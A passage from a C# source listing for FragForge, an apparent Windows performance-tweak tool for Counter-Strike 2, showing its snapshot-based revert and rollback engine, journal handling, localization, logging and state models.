                    results.Add(new TweakApplyResult { Id = plan.Definition.Id, State = rollbackErrors.Count > 0 ? TweakState.Unknown : TweakState.NotApplied, Message = ex.Message, RolledBack = rollbackErrors.Count == 0, RollbackFailed = rollbackErrors.Count > 0, Warnings = planWarnings });
                    break;
                }
            }
            if (results.Any(r => r.Changed)) warnings.Add("Se recomienda reiniciar antes de medir A/B si algún tweak lo requiere; no se reinicia automáticamente.");
        }
        catch (OperationCanceledException ex)
        {
            cancelled = true;
            failed = true;
            errors.Add("Operación cancelada: " + ex.Message);
            await AppendSafeAsync(operationId, JournalEventType.OperationFailed, null, snapshotId, ex.Message);
        }
        catch (Exception ex)
        {
            failed = true;
            errors.Add(ex.Message);
            logger.LogError(ex, "La operación {OperationId} falló antes de completar.", operationId);
            await AppendSafeAsync(operationId, JournalEventType.OperationFailed, null, snapshotId, ex.Message);
        }
        var success = !failed && !cancelled && !critical && results.All(r => !r.RollbackFailed);
        return await FinishAsync(new BatchReport { OperationId = operationId, SnapshotId = snapshotId, Success = success, Cancelled = cancelled, HasCriticalFailure = critical, RestorePointSequence = restoreSequence, Results = results, Errors = errors, Warnings = warnings }, success, CancellationToken.None);
    }

    public async Task<BatchReport> RevertAsync(RevertRequest request, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null)
    {
        await using var lease = await gate.AcquireAsync(cancellationToken);
        var operationId = NewId();
        var results = new List<TweakApplyResult>();
        var errors = new List<string>();
        var warnings = new List<string>();
        var critical = false;
        await AppendAsync(operationId, JournalEventType.OperationStarted, null, null, "Revert", cancellationToken);
        try
        {
            var modes = (request.Ids.Count > 0 ? 1 : 0) + (request.SnapshotId is not null ? 1 : 0) + (request.Last ? 1 : 0);
            if (modes != 1) throw new FragForgeException("revert_selection", "Usa exactamente uno de: IDs, --snapshot o --last.");
            var integrity = await journal.VerifyIntegrityAsync(cancellationToken);
            if (!integrity.IsValid) throw new FragForgeException("journal_integrity", "El journal no es íntegro: " + integrity.Error);
            var entries = await journal.ReadAllAsync(cancellationToken);
            var selections = SelectRevertSnapshots(request, entries);
            var currentHardware = await profiler.ProfileAsync(cancellationToken, progress);
            foreach (var selection in selections)
            {
                var snapshot = await snapshots.GetAsync(selection.SnapshotId, cancellationToken);
                var snapshotEntries = entries.Where(e => e.SnapshotId == snapshot.Id && e.EventType == JournalEventType.TweakApplied).ToArray();
                var previouslyReverted = RevertedIds(entries, snapshot.Id);
                if (snapshotEntries.Length > 0 && snapshotEntries.All(e => previouslyReverted.Contains(e.TweakId!)) && !request.Options.Force) throw new FragForgeException("snapshot_already_reverted", $"El snapshot {snapshot.Id} ya fue revertido. Force permite restaurarlo de nuevo, con riesgo de pisar cambios posteriores.");
                var selectedTweaks = selection.Ids.Count > 0 ? snapshot.Tweaks.Where(t => selection.Ids.Contains(t.TweakId, StringComparer.OrdinalIgnoreCase)).ToArray()
                    : request.Last ? snapshot.Tweaks.Where(t => snapshotEntries.Any(e => e.TweakId == t.TweakId) && (request.Options.Force || !previouslyReverted.Contains(t.TweakId))).ToArray()
                    : snapshot.Tweaks.Where(t => request.Options.Force || !previouslyReverted.Contains(t.TweakId)).ToArray();
                if (selection.Ids.Count > 0 && selectedTweaks.Length != selection.Ids.Distinct(StringComparer.OrdinalIgnoreCase).Count()) throw new FragForgeException("revert_selection", "Algún ID no pertenece al snapshot seleccionado.");
                var hardware = currentHardware with { Games = snapshot.Hardware?.Games ?? currentHardware.Games };
                if (request.Options.Cs2ExecutableOverride is not null) hardware = ApplyOverrides(hardware, null, request.Options.Cs2ExecutableOverride);
                if (request.Options.TargetUserSid is not null) hardware = ApplyOverrides(hardware, request.Options.TargetUserSid, null);
                var plans = new List<RevertPlan>();
                await AppendAsync(operationId, JournalEventType.RevertStarted, null, snapshot.Id, null, cancellationToken);
                foreach (var tweak in selectedTweaks.Reverse())
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    var context = CreateContext(operationId, hardware, snapshots.GetArtifactDirectory(snapshot.Id), request.Options.TargetUserSid ?? snapshot.Hardware?.InteractiveUserSid, true);
                    var actions = new List<(ITweakAction Action, ActionState Before)>();
                    foreach (var captured in tweak.Actions.AsEnumerable().Reverse())
                    {
                        var action = actionFactory.Create(tweak.Definition.Actions[captured.Index]);
                        await action.PreflightAsync(context, cancellationToken);
                        var drift = await action.VerifyAsync(captured.State, context, cancellationToken);
                        if (drift.Outcome != VerificationOutcome.Matches && !request.Options.Force && !tweak.Definition.ReadOnly) throw new FragForgeException("revert_drift", $"'{tweak.TweakId}' cambió desde la aplicación ({drift.Message}). Revisa el estado o usa --force para restaurar exactamente el snapshot.");
                        actions.Add((action, captured.State));
                    }
                    plans.Add(new RevertPlan(tweak, context, actions));
                }
                var snapshotFailed = false;
                foreach (var plan in plans)
                {
                    var localErrors = new List<string>();
                    foreach (var (action, before) in plan.Actions)
                    {
                        try
                        {
                            progress?.Report(new EngineProgress("revert", plan.Tweak.TweakId, 0.5, $"Restaurando {action.Kind}."));
                            await action.RevertAsync(before, plan.Context, CancellationToken.None);
                            var verification = await action.VerifyRevertAsync(before, plan.Context, CancellationToken.None);
                            if (verification.Outcome != VerificationOutcome.Matches) throw new VerificationFailedException(verification.Message);
                        }
                        catch (Exception ex) when (ex is not OutOfMemoryException)
                        {
                            localErrors.Add($"{plan.Tweak.TweakId}/{action.Kind}: {ex.Message}");
                            logger.LogError(ex, "Fallo al revertir {TweakId}.", plan.Tweak.TweakId);
                        }
                    }
                    errors.AddRange(localErrors);
                    critical |= localErrors.Count > 0;
                    snapshotFailed |= localErrors.Count > 0;
                    results.Add(new TweakApplyResult { Id = plan.Tweak.TweakId, State = localErrors.Count > 0 ? TweakState.Unknown : TweakState.NotApplied, Message = localErrors.Count > 0 ? "Reversión incompleta; revisa el journal y el snapshot." : "Estado previo restaurado y verificado.", Changed = localErrors.Count == 0, RollbackFailed = localErrors.Count > 0 });
                    await AppendAsync(operationId, localErrors.Count > 0 ? JournalEventType.RevertFailed : JournalEventType.RevertCompleted, plan.Tweak.TweakId, snapshot.Id, string.Join(" ", localErrors), CancellationToken.None);
                    if (localErrors.Count == 0)
                    {
                        var actionPlan = new ActionPlan(plan.Tweak.Definition, plan.Actions.Select(a => a.Action).ToList(), plan.Tweak.Actions.Select(a => a.State).ToList(), plan.Context, "");
                        await RunHooksAsync(ExperimentPhase.AfterRevert, operationId, snapshot.Id, actionPlan, hardware, snapshots.GetArtifactDirectory(snapshot.Id), CancellationToken.None, warnings, false);
                    }
                }
                var updatedEntries = await journal.ReadAllAsync(CancellationToken.None);
                var appliedIds = snapshotEntries.Where(e => e.TweakId is not null).Select(e => e.TweakId!).Distinct(StringComparer.OrdinalIgnoreCase).ToArray();
                var revertedIds = RevertedIds(updatedEntries, snapshot.Id);
                if (!snapshotFailed && (appliedIds.Length == 0 || appliedIds.All(revertedIds.Contains))) await AppendAsync(operationId, JournalEventType.SnapshotReverted, null, snapshot.Id, null, CancellationToken.None);
            }
        }
        catch (OperationCanceledException ex) { errors.Add("Reversión cancelada antes de iniciar el siguiente bloque: " + ex.Message); }
        catch (Exception ex) { errors.Add(ex.Message); logger.LogError(ex, "Falló la reversión {OperationId}.", operationId); }
        var success = errors.Count == 0 && !critical && results.All(r => !r.RollbackFailed);
        await AppendSafeAsync(operationId, success ? JournalEventType.OperationCompleted : JournalEventType.OperationFailed, null, request.SnapshotId, success ? "Reversión completada." : string.Join(" ", errors));
        return new BatchReport { OperationId = operationId, SnapshotId = request.SnapshotId, Success = success, HasCriticalFailure = critical, Results = results, Errors = errors, Warnings = warnings };
    }

    private async Task<TweakStatus> EvaluateAsync(TweakDefinition definition, HardwareProfile hardware, IReadOnlySet<string> owned, CancellationToken cancellationToken)
    {
        var condition = EvaluateConditions(definition, hardware);
        if (!condition.IsMet) return new(definition.Id, TweakState.NotApplicable, condition.Reason, [], []);
        try
        {
            var context = CreateContext("scan", hardware, null, hardware.InteractiveUserSid, false);
            var actions = definition.Actions.Select(actionFactory.Create).ToArray();
            foreach (var action in actions) await action.PreflightAsync(context, cancellationToken);
            var states = new List<ActionState>();
            var verifications = new List<VerificationResult>();
            foreach (var action in actions)
            {
                var before = await action.CaptureAsync(context, cancellationToken);
                states.Add(before);
                verifications.Add(await action.VerifyAsync(before, context, cancellationToken));
            }
            var observations = states.OfType<InspectionActionState>().SelectMany(s => s.Observations).ToArray();
            if (definition.ReadOnly) return new(definition.Id, TweakState.Inspected, "Solo lectura; no hay cambios que aplicar.", verifications, observations);
            var state = Classify(verifications, owned.Contains(definition.Id));
            var reason = string.Join(" ", verifications.Select(v => v.Message));
            return new(definition.Id, state, reason, verifications, observations);
        }
        catch (ActionNotApplicableException ex) { return new(definition.Id, TweakState.NotApplicable, ex.Message, [], []); }
        catch (Exception ex) when (ex is not OperationCanceledException) { return new(definition.Id, TweakState.Unknown, ex.Message, [], []); }
    }

    private static TweakState Classify(IReadOnlyList<VerificationResult> results, bool owned)
    {
        if (results.Count == 0 || results.Any(r => r.Outcome == VerificationOutcome.Unknown)) return TweakState.Unknown;
        var matches = results.Count(r => r.Outcome == VerificationOutcome.Matches);
        if (matches == results.Count) return owned ? TweakState.Applied : TweakState.AppliedExternally;
        if (matches == 0 && results.All(r => r.Outcome == VerificationOutcome.DoesNotMatch)) return TweakState.NotApplied;
        return TweakState.PartiallyApplied;
    }

    private ConditionResult EvaluateConditions(TweakDefinition definition, HardwareProfile hardware)
    {
        foreach (var specification in definition.Conditions)
        {
            var result = conditionFactory.Create(specification).Evaluate(hardware);
            if (!result.IsKnown) return ConditionResult.Unknown(result.Reason);
            if (!result.IsMet) return result;
        }
        return ConditionResult.Met(definition.Conditions.Count == 0 ? "Sin condiciones restrictivas." : "Todas las condiciones se cumplen.");
    }

    private async Task<ActionPlan?> TryBuildPlanAsync(TweakDefinition definition, HardwareProfile hardware, ApplyOptions? options, string operationId, CancellationToken cancellationToken)
    {
        var context = CreateContext(operationId, hardware, null, options?.TargetUserSid ?? hardware.InteractiveUserSid, options?.AllowPowerShellActions ?? false);
        var actions = new List<ITweakAction>();
        try
        {
            foreach (var specification in definition.Actions)
            {
                var action = actionFactory.Create(specification);
                await action.PreflightAsync(context, cancellationToken);
                actions.Add(action);
            }
        }
        catch (ActionNotApplicableException) { return null; }
        return new ActionPlan(definition, actions, [], context, EvaluateConditions(definition, hardware).Reason);
    }

    private async Task<SystemSnapshot> CaptureAndPersistAsync(string operationId, string label, HardwareProfile hardware, IReadOnlyList<ActionPlan> plans, bool createRestorePoint, CancellationToken cancellationToken, IProgress<EngineProgress>? progress)
    {
        var snapshotId = NewId();
        var artifactDirectory = snapshots.GetArtifactDirectory(snapshotId);
        Directory.CreateDirectory(artifactDirectory);
        var captured = new List<TweakSnapshot>();
        var registryStates = new List<RegistryActionState>();
        foreach (var plan in plans)
        {
            cancellationToken.ThrowIfCancellationRequested();
            var context = plan.Context with { OperationId = operationId, ArtifactDirectory = artifactDirectory, Progress = new ProgressAdapter(progress, plan.Definition.Id) };
            plan.Context = context;
            var actions = new List<CapturedAction>();
            for (var i = 0; i < plan.Actions.Count; i++)
            {
                var state = await plan.Actions[i].CaptureAsync(context, cancellationToken);
                actions.Add(new CapturedAction(i, plan.Actions[i].Kind, state));
                if (state is RegistryActionState registry) registryStates.Add(registry);
            }
            captured.Add(new TweakSnapshot { TweakId = plan.Definition.Id, DefinitionSha256 = catalog.GetDefinitionHash(plan.Definition.Id), Definition = plan.Definition, Actions = actions });
            await AppendAsync(operationId, JournalEventType.TweakCaptureCompleted, plan.Definition.Id, snapshotId, null, cancellationToken);
        }
        if (registryStates.Count > 0) await RegistryBackupExporter.WriteAsync(Path.Combine(artifactDirectory, "registry-before.reg"), registryStates, cancellationToken);
        long? sequence = null;
        if (createRestorePoint && plans.Any(p => !p.Definition.ReadOnly))
        {
            progress?.Report(new EngineProgress("restore-point", null, 0.1, "Creando punto de restauración."));
            var restoreResult = await restore.CreateAsync("FragForge " + operationId[..8], cancellationToken);
            sequence = restoreResult.Sequence;
            await AppendAsync(operationId, JournalEventType.RestorePointCreated, null, snapshotId, restoreResult.Message, cancellationToken);
        }
        var snapshot = new SystemSnapshot { Id = snapshotId, Label = label, Hardware = hardware, RestorePointSequence = sequence, Tweaks = captured };
        await snapshots.SaveAsync(snapshot, cancellationToken);
        await AppendAsync(operationId, JournalEventType.SnapshotCreated, null, snapshotId, label, cancellationToken);
        return snapshot;
    }

    private async Task<IReadOnlyList<string>> RollbackAsync(string operationId, string snapshotId, string tweakId, IReadOnlyList<(ITweakAction Action, ActionState Before)> attempted, ActionExecutionContext context)
    {
        var errors = new List<string>();
        await AppendSafeAsync(operationId, JournalEventType.TweakRollbackStarted, tweakId, snapshotId, null);
        foreach (var (action, before) in attempted.AsEnumerable().Reverse())
        {
            try
            {
                await action.RevertAsync(before, context, CancellationToken.None);
                var verification = await action.VerifyRevertAsync(before, context, CancellationToken.None);
                if (verification.Outcome != VerificationOutcome.Matches) throw new VerificationFailedException(verification.Message);
            }
            catch (Exception ex) when (ex is not OutOfMemoryException) { errors.Add($"{tweakId}/{action.Kind}: {ex.Message}"); }
        }
        await AppendSafeAsync(operationId, errors.Count == 0 ? JournalEventType.TweakRolledBack : JournalEventType.TweakRollbackFailed, tweakId, snapshotId, string.Join(" ", errors));
        return errors;
    }

    private async Task<TweakStatus> VerifyPlanAsync(ActionPlan plan, CancellationToken cancellationToken)
    {
        var states = new List<ActionState>();
        var results = new List<VerificationResult>();
        foreach (var action in plan.Actions)
        {
            var before = await action.CaptureAsync(plan.Context, cancellationToken);
            states.Add(before);
            results.Add(await action.VerifyAsync(before, plan.Context, cancellationToken));
        }
        plan.States.Clear();
        plan.States.AddRange(states);
        return new(plan.Definition.Id, Classify(results, false), string.Join(" ", results.Select(r => r.Message)), results, states.OfType<InspectionActionState>().SelectMany(s => s.Observations).ToArray());
    }

    private async Task RunHooksAsync(ExperimentPhase phase, string operationId, string snapshotId, ActionPlan plan, HardwareProfile hardware, string artifactDirectory, CancellationToken cancellationToken, List<string> warnings, bool failOnError)
    {
        foreach (var hook in _hooks)
        {
            try
            {
                var artifacts = await hook.RunAsync(new ExperimentContext(operationId, snapshotId, phase, plan.Definition, hardware, DateTimeOffset.UtcNow, artifactDirectory), cancellationToken);
                await AppendAsync(operationId, JournalEventType.HookCompleted, plan.Definition.Id, snapshotId, $"{phase}: {hook.GetType().Name}; artifacts={artifacts.Count}", cancellationToken);
            }
            catch (Exception ex) when (ex is not OutOfMemoryException)
            {
                if (failOnError) throw new FragForgeException("experiment_hook_failed", $"El gancho {phase} falló antes de aplicar: {ex.Message}", ex);
                warnings.Add($"Gancho {phase}: {ex.Message}");
            }
        }
    }

    private ActionExecutionContext CreateContext(string operationId, HardwareProfile hardware, string? artifactDirectory, string? userSid, bool allowPowerShell) => new()
    {
        OperationId = operationId, Hardware = hardware, ArtifactDirectory = artifactDirectory, TargetUserSid = userSid, AllowPowerShellActions = allowPowerShell
    };

    private static HardwareProfile ApplyOverrides(HardwareProfile profile, string? userSid, string? cs2Path)
    {
        if (userSid is not null && !System.Text.RegularExpressions.Regex.IsMatch(userSid, @"^S-1-\d+(?:-\d+)+$")) throw new FragForgeException("invalid_sid", "SID de usuario inválido.");
        if (cs2Path is not null)
        {
            var full = Path.GetFullPath(Environment.ExpandEnvironmentVariables(cs2Path));
            if (!Path.GetFileName(full).Equals("cs2.exe", StringComparison.OrdinalIgnoreCase) || !File.Exists(full)) throw new FragForgeException("invalid_cs2_path", "La ruta manual debe apuntar a un cs2.exe existente.");
            profile = profile with { Games = new GameInfo { Cs2ExecutablePath = full, Cs2DetectionSource = "Manual", Cs2Candidates = [full] } };
        }
        if (userSid is not null) profile = profile with { InteractiveUserSid = userSid };
        return profile;
    }

    private async Task<HashSet<string>> ReadOwnershipAsync(CancellationToken cancellationToken)
    {
        var owned = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        try
        {
            var entries = await journal.ReadAllAsync(cancellationToken);
            var revertedSnapshots = entries.Where(e => e.EventType == JournalEventType.SnapshotReverted && e.SnapshotId is not null).Select(e => e.SnapshotId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
            foreach (var entry in entries)
            {
                if (entry.EventType == JournalEventType.TweakApplied && entry.TweakId is not null && entry.SnapshotId is not null && !revertedSnapshots.Contains(entry.SnapshotId)) owned.Add(entry.TweakId);
                if (entry.EventType is JournalEventType.TweakRolledBack or JournalEventType.RevertCompleted && entry.TweakId is not null) owned.Remove(entry.TweakId);
            }
            foreach (var entry in entries.Where(e => e.EventType == JournalEventType.SnapshotReverted))
                foreach (var applied in entries.Where(e => e.SnapshotId == entry.SnapshotId && e.EventType == JournalEventType.TweakApplied && e.TweakId is not null)) owned.Remove(applied.TweakId!);
        }
        catch (Exception ex) when (ex is JsonException or IOException or InvalidDataException) { logger.LogWarning(ex, "No se pudo leer el journal; el estado coincidente se marcará externo."); }
        return owned;
    }

    private static IReadOnlyList<(string SnapshotId, IReadOnlyList<string> Ids)> SelectRevertSnapshots(RevertRequest request, IReadOnlyList<JournalEntry> entries)
    {
        if (request.SnapshotId is not null) return [(request.SnapshotId, [])];
        var reverted = entries.Where(e => e.EventType == JournalEventType.RevertCompleted && e.TweakId is not null).Select(e => e.TweakId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
        var snapshotReverted = entries.Where(e => e.EventType == JournalEventType.SnapshotReverted && e.SnapshotId is not null).Select(e => e.SnapshotId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
        var applied = entries.Where(e => e.EventType == JournalEventType.TweakApplied && e.TweakId is not null && e.SnapshotId is not null && !snapshotReverted.Contains(e.SnapshotId)).ToArray();
        if (request.Last)
        {
            var last = applied.LastOrDefault(e => request.Options.Force || !reverted.Contains(e.TweakId!));
            if (last is null) throw new FragForgeException("no_snapshot", "No hay un snapshot aplicado pendiente de revertir.");
            return [(last.SnapshotId!, [])];
        }
        var result = new List<(string, IReadOnlyList<string>)>();
        foreach (var id in request.Ids.Distinct(StringComparer.OrdinalIgnoreCase))
        {
            var entry = applied.LastOrDefault(e => e.TweakId!.Equals(id, StringComparison.OrdinalIgnoreCase) && (request.Options.Force || !reverted.Contains(id)));
            if (entry is null) throw new FragForgeException("no_snapshot", $"No hay una aplicación propia reversible de '{id}'. No se deshacen cambios externos/Atlas sin un snapshot explícito.");
            result.Add((entry.SnapshotId!, [id]));
        }
        return result.GroupBy(x => x.Item1, StringComparer.OrdinalIgnoreCase).Select(g => (g.Key, (IReadOnlyList<string>)g.SelectMany(x => x.Item2).Distinct(StringComparer.OrdinalIgnoreCase).ToArray())).ToArray();
    }

    private static HashSet<string> RevertedIds(IReadOnlyList<JournalEntry> entries, string snapshotId)
    {
        var ids = entries.Where(e => e.SnapshotId == snapshotId && e.EventType == JournalEventType.RevertCompleted && e.TweakId is not null).Select(e => e.TweakId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
        if (entries.Any(e => e.SnapshotId == snapshotId && e.EventType == JournalEventType.SnapshotReverted))
            foreach (var entry in entries.Where(e => e.SnapshotId == snapshotId && e.EventType == JournalEventType.TweakApplied && e.TweakId is not null)) ids.Add(entry.TweakId!);
        return ids;
    }

    private async Task<BatchReport> FinishAsync(BatchReport report, bool success, CancellationToken cancellationToken)
    {
        await AppendSafeAsync(report.OperationId, success ? JournalEventType.OperationCompleted : JournalEventType.OperationFailed, null, report.SnapshotId, success ? "Operación completada." : string.Join(" ", report.Errors));
        return report;
    }
    private Task AppendAsync(string operationId, JournalEventType type, string? tweakId, string? snapshotId, string? message, CancellationToken cancellationToken) => journal.AppendAsync(new JournalEntry { EntryId = NewId(), OperationId = operationId, EventType = type, TweakId = tweakId, SnapshotId = snapshotId, Message = message }, cancellationToken);
    private async Task AppendSafeAsync(string operationId, JournalEventType type, string? tweakId, string? snapshotId, string? message)
    {
        try { await AppendAsync(operationId, type, tweakId, snapshotId, message, CancellationToken.None); }
        catch (Exception ex) { logger.LogCritical(ex, "No se pudo escribir el journal. No continúes aplicando cambios."); throw new RollbackException("El journal no pudo persistirse; revisa disco/permisos antes de continuar.", ex); }
    }
    private static TweakApplyResult Skipped(string id, TweakState state, string message) => new() { Id = id, State = state, Message = message };
    private static string NewId() => Guid.NewGuid().ToString("D");
    private sealed class ActionPlan(TweakDefinition definition, IReadOnlyList<ITweakAction> actions, List<ActionState> states, ActionExecutionContext context, string conditionReason)
    {
        public TweakDefinition Definition { get; } = definition;
        public IReadOnlyList<ITweakAction> Actions { get; } = actions;
        public List<ActionState> States { get; } = states;
        public ActionExecutionContext Context { get; set; } = context;
        public string ConditionReason { get; } = conditionReason;
    }
    private sealed record RevertPlan(TweakSnapshot Tweak, ActionExecutionContext Context, IReadOnlyList<(ITweakAction Action, ActionState Before)> Actions);
    private sealed class ProgressAdapter(IProgress<EngineProgress>? outer, string tweakId) : IProgress<ActionProgress>
    {
        public void Report(ActionProgress value) => outer?.Report(new EngineProgress(value.Stage, tweakId, value.Fraction, value.Message));
    }
}

internal static class ActionProgressExtensions
{
    public static void ReportReady(this ITweakAction action, ActionExecutionContext context, string stage, double fraction, string message) => context.Report(stage, fraction, message);
}
````

### `src/FragForge.Core/FragForge.Core.csproj`  <sub>(10 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <ItemGroup>
    <EmbeddedResource Include="Policy/denylist.json" />
    <None Include="Policy/denylist.json" CopyToOutputDirectory="PreserveNewest" TargetPath="Policy/denylist.json" />
  </ItemGroup>
  <ItemGroup>
    <PackageReference Include="Microsoft.Extensions.Logging.Abstractions" />
    <PackageReference Include="Microsoft.Extensions.DependencyInjection.Abstractions" />
  </ItemGroup>
</Project>
````

### `src/FragForge.Core/Localization/Localizer.cs`  <sub>(22 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Logging;

namespace FragForge.Core.Localization;

public sealed class Localizer
{
    private readonly IReadOnlyDictionary<string, string> _strings;
    public string Culture { get; }
    public Localizer(string culture, IReadOnlyDictionary<string, string> strings)
    {
        Culture = culture.StartsWith("en", StringComparison.OrdinalIgnoreCase) ? "en-US" : "es-MX";
        _strings = strings;
    }
    public string this[string key] => _strings.TryGetValue(key, out var value) ? value : key;
    public string Format(string key, params object[] args) => string.Format(System.Globalization.CultureInfo.GetCultureInfo(Culture), this[key], args);
    public static Localizer FromJson(string culture, string json)
    {
        var values = JsonSerializer.Deserialize<Dictionary<string, string>>(json, JsonDefaults.Options) ?? throw new InvalidDataException("Localization file is empty.");
        return new Localizer(culture, values);
    }
}
````

### `src/FragForge.Core/Localization/UiLogSink.cs`  <sub>(36 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Core.Localization;

public sealed class UiLogSink : IUiLogSink
{
    private readonly System.Collections.Concurrent.ConcurrentQueue<string> _history = new();
    private readonly List<Action<string>> _subscribers = [];
    private readonly object _gate = new();
    public void Write(string level, string message)
    {
        var line = $"{DateTimeOffset.Now:HH:mm:ss.fff} [{level}] {message}";
        _history.Enqueue(line);
        while (_history.Count > 500 && _history.TryDequeue(out _)) { }
        lock (_gate) { foreach (var subscriber in _subscribers.ToArray()) subscriber(line); }
        MessageWritten?.Invoke(this, line);
    }
    public event EventHandler<string>? MessageWritten;
    public IReadOnlyList<string> History => _history.ToArray();
    public IObservable<string> Messages => new LogObservable(this);
    private sealed class LogObservable(UiLogSink owner) : IObservable<string>
    {
        public IDisposable Subscribe(IObserver<string> observer)
        {
            foreach (var line in owner._history.ToArray()) observer.OnNext(line);
            void Handler(string line) => observer.OnNext(line);
            lock (owner._gate) owner._subscribers.Add(Handler);
            return new Subscription(() => { lock (owner._gate) owner._subscribers.Remove(Handler); });
        }
    }
    private sealed class Subscription(Action dispose) : IDisposable
    {
        private Action? _dispose = dispose;
        public void Dispose() => Interlocked.Exchange(ref _dispose, null)?.Invoke();
    }
}
````

### `src/FragForge.Core/Logging/JsonDefaults.cs`  <sub>(19 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.Json.Serialization;

namespace FragForge.Core.Logging;

public static class JsonDefaults
{
    public static JsonSerializerOptions Options { get; } = Create();
    public static JsonSerializerOptions Create(bool indented = true) => new()
    {
        WriteIndented = indented,
        PropertyNameCaseInsensitive = true,
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
        Converters = { new JsonStringEnumConverter(null, allowIntegerValues: false) },
        NumberHandling = JsonNumberHandling.Strict,
        UnmappedMemberHandling = JsonUnmappedMemberHandling.Disallow
    };
}
````

### `src/FragForge.Core/Logging/UiLogger.cs`  <sub>(22 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using Microsoft.Extensions.Logging;

namespace FragForge.Core.Logging;

public sealed class UiLoggerProvider(IUiLogSink sink) : ILoggerProvider
{
    public ILogger CreateLogger(string categoryName) => new UiLogger(categoryName, sink);
    public void Dispose() { }
    private sealed class UiLogger(string category, IUiLogSink sink) : ILogger
    {
        public IDisposable? BeginScope<TState>(TState state) where TState : notnull => null;
        public bool IsEnabled(LogLevel logLevel) => logLevel >= LogLevel.Information;
        public void Log<TState>(LogLevel logLevel, EventId eventId, TState state, Exception? exception, Func<TState, Exception?, string> formatter)
        {
            if (!IsEnabled(logLevel)) return;
            var message = $"{category}: {formatter(state, exception)}";
            if (exception is not null) message += $" | {exception.GetType().Name}: {exception.Message}";
            sink.Write(logLevel.ToString(), message);
        }
    }
}
````

### `src/FragForge.Core/Models/ActionState.cs`  <sub>(124 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.Json.Serialization;

namespace FragForge.Core.Models;

[JsonPolymorphic(TypeDiscriminatorPropertyName = "$actionState")]
[JsonDerivedType(typeof(RegistryActionState), "registry")]
[JsonDerivedType(typeof(ServiceActionState), "service")]
[JsonDerivedType(typeof(ScheduledTaskActionState), "scheduledTask")]
[JsonDerivedType(typeof(PowerPlanActionState), "powerPlan")]
[JsonDerivedType(typeof(BcdActionState), "bcd")]
[JsonDerivedType(typeof(NetworkPropertyActionState), "network")]
[JsonDerivedType(typeof(FileActionState), "file")]
[JsonDerivedType(typeof(ScriptActionState), "script")]
[JsonDerivedType(typeof(InspectionActionState), "inspection")]
public abstract record ActionState
{
    [JsonIgnore] public abstract string Kind { get; }
}

public sealed record RegistryValueCapture
{
    public required string Key { get; init; }
    public required string Name { get; init; }
    public bool KeyExisted { get; init; }
    public bool ValueExisted { get; init; }
    public string? ValueKind { get; init; }
    public string? StringData { get; init; }
    public long? IntegerData { get; init; }
    public IReadOnlyList<string>? MultiStringData { get; init; }
    public string? BinaryBase64 { get; init; }
    public IReadOnlyList<string> MissingAncestors { get; init; } = [];
}

public sealed record RegistryActionState : ActionState
{
    public override string Kind => "Registry";
    public IReadOnlyList<RegistryValueCapture> Values { get; init; } = [];
}

public sealed record ServiceCapture
{
    public required string Name { get; init; }
    public bool Exists { get; init; }
    public string? StartMode { get; init; }
    public string? State { get; init; }
    public bool? DelayedAutoStart { get; init; }
    public bool DelayedAutoStartExisted { get; init; }
}

public sealed record ServiceActionState : ActionState
{
    public override string Kind => "Service";
    public required ServiceCapture Service { get; init; }
}

public sealed record ScheduledTaskActionState : ActionState
{
    public override string Kind => "ScheduledTask";
    public required string Path { get; init; }
    public bool Exists { get; init; }
    public bool Enabled { get; init; }
    public string? XmlDefinition { get; init; }
}

public sealed record PowerSettingCapture(string SubgroupGuid, string SettingGuid, int AcIndex, int DcIndex);
public sealed record PowerPlanActionState : ActionState
{
    public override string Kind => "PowerPlan";
    public required string PlanName { get; init; }
    public string? PreviousActiveGuid { get; init; }
    public string? OwnedPlanGuid { get; init; }
    public bool PlanExisted { get; init; }
    public IReadOnlyList<PowerSettingCapture> Settings { get; init; } = [];
    public string? ExportArtifact { get; init; }
}

public sealed record BcdActionState : ActionState
{
    public override string Kind => "Bcdedit";
    public required string Element { get; init; }
    public bool Existed { get; init; }
    public string? PreviousValue { get; init; }
    public required string ExportArtifact { get; init; }
}

public sealed record NetworkPropertyCapture
{
    public required string AdapterName { get; init; }
    public required string Keyword { get; init; }
    public bool Exists { get; init; }
    public IReadOnlyList<string> RegistryValue { get; init; } = [];
    public string? DisplayValue { get; init; }
}
public sealed record NetworkPropertyActionState : ActionState
{
    public override string Kind => "NetAdapterProperty";
    public IReadOnlyList<NetworkPropertyCapture> Properties { get; init; } = [];
}

public sealed record FileActionState : ActionState
{
    public override string Kind => "FileEdit";
    public required string Path { get; init; }
    public bool Existed { get; init; }
    public string? ContentBase64 { get; init; }
    public DateTimeOffset? LastWriteTimeUtc { get; init; }
    public IReadOnlyList<string> MissingDirectories { get; init; } = [];
}

public sealed record ScriptActionState : ActionState
{
    public override string Kind => "PowerShell";
    public required string ScriptSha256 { get; init; }
    public required JsonElement CapturedJson { get; init; }
}

public sealed record InspectionActionState : ActionState
{
    public override string Kind => "InspectOnly";
    public IReadOnlyList<DiagnosticObservation> Observations { get; init; } = [];
}

public sealed record CapturedAction(int Index, string Kind, ActionState State);
````

### `src/FragForge.Core/Models/Enums.cs`  <sub>(15 líneas)</sub>

````csharp
namespace FragForge.Core.Models;

public enum EvidenceLevel { High, Medium, Low, Experimental }
public enum RiskLevel { Safe, Moderate, Advanced, Experimental }
public enum TweakState { NotApplied, Applied, PartiallyApplied, NotApplicable, Unknown, AppliedExternally, Inspected }
public enum TweakProfile { Safe, Balanced, Competitive, Advanced }
public enum VerificationOutcome { Matches, DoesNotMatch, Partial, Unknown }
public enum FeatureState { Unknown, Enabled, Disabled, NotPresent }
public enum MemoryChannelState { Unknown, Single, Dual, Other }
public enum GpuVendor { Unknown, Intel, Nvidia, Amd, Microsoft, Other }
public enum DiskKind { Unknown, Hdd, Ssd, Nvme, Scm }
